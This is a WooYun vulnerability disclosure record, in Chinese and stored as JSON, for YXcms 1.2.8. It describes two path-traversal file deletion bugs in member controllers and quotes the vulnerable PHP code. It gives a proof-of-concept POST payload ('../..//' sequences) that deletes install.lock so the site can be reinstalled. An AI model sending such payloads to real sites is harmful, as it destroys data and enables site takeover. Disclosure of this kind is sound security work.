{"id": 32093, "wybug_id": "wooyun-2015-0112273", "wybug_title": "YXcms1.2.8两处任意文件删除可reinstall", "wybug_corp": "yxcms.net", "wybug_author": "zxx", "wybug_date": "2015-05-11 10:51", "wybug_open_date": "2015-08-09 10:54", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向公众公开  简要描述： 1.2.8 详细说明：  一处没有过滤，一处过滤失误第一处：/protected/apps/member/controller/inforController.php\npublic function index()\t    {        $auth=$this->auth;        $id=$auth['id'];        if(!$this->isPost()){           $info=model('members')->find(\"id='{$id}'\");           $this->info=$info;           $this->path=__ROOT__.'/upload/member/image/';           $this->twidth=config('HEAD_W');           $this->theight=config('HEAD_H');           $this->display();        }else{           if(!empty($_POST['email']) && !Check::email(trim($_POST['email']))) $this->error('邮箱格式错误~');           $data['nickname']=in(trim($_POST['nickname']));           $acc=model('members')->find(\"id!='{$id}' AND nickname='\".$data['nickname'].\"'\");           if(!empty($acc['nickname'])) $this->error('该昵称已经有人使用~');           if (empty($_FILES['headpic']['name']) === false){                $tfile=date(\"Ymd\");                $imgupload= $this->upload($this->uploadpath.$tfile.'/',config('imgupSize'),'jpg,bmp,gif,png');                $imgupload->saveRule='thumb_'.time();                $imgupload->upload();                $fileinfo=$imgupload->getUploadFileInfo();                $errorinfo=$imgupload->getErrorMsg();                if(!empty($errorinfo)) $this->alert($errorinfo);                else{                    if(!empty($_POST['oldheadpic'])){                       $picpath=$this->uploadpath.$_POST['oldheadpic'];                       if(file_exists($picpath)) @unlink($picpath); //修改个人资料时没有对$_POST['oldheadpic']参数进行过滤，可以传入../                    }                    $data['headpic']=$tfile.'/'.$fileinfo[0]['savename'];                }          }           $data['email']=in($_POST['email']);           $data['tel']=in($_POST['tel']);           $data['qq']=in($_POST['qq']);           model('members')->update(\"id='{$id}'\",$data);           $info=model('members')->find(\"id='{$id}'\");           if($info['headpic'] && !Check::url($info['headpic'])) $info['headpic']=__UPLOAD__.'/member/image/'.$info['headpic'];           $cookie_auth = $info['id'].'\\t'.$info['groupid'].'\\t'.$info['account'].'\\t'.$info['nickname'].'\\t'.$info['lastip'].'\\t'.$info['headpic'];           set_cookie('auth',$cookie_auth,0);           $this->success('信息编辑成功~');        }\t    }\n第二处：/protected/apps/member/controller/newsController.php 过滤失误\n//封面图删除\tpublic function delcover()\t{\t\t//文件保存目录\t\t$id=in($_POST['id']);\t\t$pic=in($_POST['pic']);\t\t$pic=str_replace('./', '', $pic); //将./过滤为空，使用../..//将变成../\t\t$data['picture']= $this->nopic;\t\tif(model('news')->update(\"id='$id' and account='\".$this->mesprefix.$this->auth['account'].\"'\",$data)){\t\t\t$picpath=$this->uploadpath.$pic;            echo $picpath;\t\t\tif(file_exists($picpath)) @unlink($picpath);\t\t\techo 1;\t\t}else echo '删除封面失败~';\t}\n   漏洞证明：  POC1：\n\nPOC2:http://localhost/index.php?r=member/news/delcoverPOST:id=17&pic=../..//../..//../..//protected/apps/install/install.lock\n\n\n\n   修复方案：  过滤一下，其他地方截取后3位的检测方法不太好   版权声明：转载请注明来源 zxx@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-05-11 10:53 厂商回复： 谢谢关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}